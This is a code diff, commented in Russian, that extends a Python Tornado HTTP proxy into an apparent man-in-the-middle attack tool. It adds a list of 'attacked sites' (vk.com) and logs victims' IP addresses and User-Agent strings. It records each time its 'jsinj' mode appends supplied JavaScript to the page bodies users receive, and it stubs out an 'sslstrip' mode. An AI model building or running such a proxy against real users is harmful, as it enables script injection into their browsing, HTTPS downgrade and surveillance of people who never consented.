@@ -9,19 +9,26 @@ import os, platform, logging
 import socket
 import argparse
 from urllib.parse import urlparse
+from ourlogging import Logging
 
-#Создание лог файла
+# Список атакуемых сайтов
+list_target_hosts = ['vk.com', ]
+
+
+# Создание файлаов лога
 if platform.platform().startswith('Windows'):
-    logging_file = os.path.join(os.getenv('HOMEDRIVE'), \
-                                os.getenv('HOMEPATH'), 'log_proxy_server.log')
+    logging_file = os.path.join(os.getenv('HOMEDRIVE'), os.getenv('HOMEPATH'), 'log_proxy_server.log')
+    logging_main = Logging(os.path.join(os.getenv('HOMEDRIVE'), os.getenv('HOMEPATH'), 'main.log'))
+    logging_output = Logging(os.path.join(os.getenv('HOMEDRIVE'), os.getenv('HOMEPATH'), 'proxyserver.output'))
 else:
-    logging_file = os.path.join(os.getenv('HOME'), \
-                                'log_proxy_server.log')
+    logging_file = os.path.join(os.getenv('HOME'), 'log_proxy_server.log')
+    logging_main = Logging(os.path.join(os.getenv('HOME'), 'main.log'))
+    logging_output = Logging(os.path.join(os.getenv('HOME'), 'proxyserver.output'))
 
-
+# Этот лог моего формата, пусть останется пока что
 print("Сохраняем лог в ", logging_file)
 
-#Настройка лог файла
+# Настройка лог файла
 logging.basicConfig(
     level=logging.DEBUG,
     format='%(asctime)s : %(levelname)s : %(message)s',
@@ -61,6 +68,7 @@ def fetch_request(url, callback, **kwargs):
     client = tornado.httpclient.AsyncHTTPClient()
     client.fetch(req, callback, raise_error=False)
 
+
 class ProxyHandler(tornado.web.RequestHandler):
     SUPPORTED_METHODS = ['GET', 'POST', 'CONNECT']
 
@@ -74,8 +82,13 @@ class ProxyHandler(tornado.web.RequestHandler):
     @tornado.web.asynchronous
     def get(self):
 
+        #Сбор статистики в лог файл
+        msg_log = self.request.remote_ip + ' : ' + self.request.headers['User-Agent']
+        logging_output.write_log('СТАТИСТИКА', msg_log)
+
         logging.info('Handle %s request to %s', self.request.method,\
                      self.request.uri)
+
         def handle_response(response):
             if (response.error and not isinstance(response.error, tornado.httpclient.HTTPError)):
                 self.set_status(500)
@@ -93,6 +106,8 @@ class ProxyHandler(tornado.web.RequestHandler):
                 if (response.body and self.mode == 'jsinj'):
                     self.set_header('Content-Length', len(response.body) + len(self.jscript))
                     self.write(response.body + self.jscript)
+                    #Отчет о внедрении JavaScript
+                    logging_output.write_log('JS INJECTED', 'Пользователю с IP: ' + self.request.remote_ip + 'JS внедрен')
                     logging.info("Body response: {}".format(response.body))
                 elif response.body:
                     self.set_header('Content-Length', len(response.body))
@@ -116,9 +131,11 @@ class ProxyHandler(tornado.web.RequestHandler):
             if hasattr(e, 'response') and e.response:
                 handle_response(e.response)
             else:
+                logging_main.write_log('ОШИБКА', 'Внутренняя ошибка прокси-сервера')
                 self.set_status(500)
                 self.write('Internal server error:\n' + str(e))
                 self.finish()
+
 
     @tornado.web.asynchronous
     def post(self):
@@ -185,8 +202,6 @@ class ProxyHandler(tornado.web.RequestHandler):
             upstream.connect((host, int(port)), start_tunnel)
 
 
-#def run_proxy(port, start_ioloop=True):
-
 def run_proxy(port, mode=None, jscript=None, start_ioloop=True):
     """
     Run proxy on the specified port. If start_ioloop is True (default),
@@ -202,12 +217,18 @@ def run_proxy(port, mode=None, jscript=None, start_ioloop=True):
             app = tornado.web.Application([
                 (r'.*', ProxyHandler, dict(m=mode, j=payload_js))
             ])
+        # Здесь не реализовано
+        elif mode == 'sslstrip':
+            app = tornado.web.Application([
+                (r'.*', ProxyHandler, dict(m=mode))
+            ])
         else:
             app = tornado.web.Application([
                 (r'.*', ProxyHandler),
             ])
     except Exception as e:
         print("Не верные параметры скрипта!\n")
+        logging_main.write_log('ОШИБКА', 'Не верные параметры скрипта при запуске Proxy Server')
         sys.exit(1)
 
     app.listen(port)
@@ -229,8 +250,20 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     print("Starting HTTP proxy on port %d" % args.port)
-
-    run_proxy(args.port, args.mode, args.jscript)
+    msg = 'Старт модуля Proxy Server в режиме - '
+    if args.mode == 'jsinj':
+        msg += 'JavaScript Injection'
+    elif args.mode == 'sslstrip':
+        msg += 'SSL Strip'
+    else:
+        msg += 'Сбора статистики'
+    logging_main.write_log('ЗАПУСК МОДУЛЯ', msg)
+    try:
+        run_proxy(args.port, args.mode, args.jscript)
+    except Exception as e:
+        logging_main.write_log('ОШИБКА', 'При запуске Proxy Server возникла ошибка')
+        logging_main.write_log('ОШИБКА', 'Proxy Server не смог запуститься')
+        sys.exit(2)
 
 
 
